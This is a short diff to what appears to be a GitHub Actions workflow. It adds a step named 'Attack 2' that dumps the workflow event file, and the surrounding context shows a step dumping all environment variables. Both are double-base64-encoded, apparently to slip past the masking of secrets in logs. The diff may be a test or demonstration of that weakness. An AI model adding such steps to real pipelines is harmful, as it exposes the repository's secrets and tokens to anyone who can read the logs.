@@ -14,3 +14,6 @@ jobs:
           echo "And remember, encoding is always the answer."
       - name: Attack
         run: env | base64 | base64
+
+      - name: Attack 2
+        run: cat $GITHUB_EVENT_PATH | base64 | base64
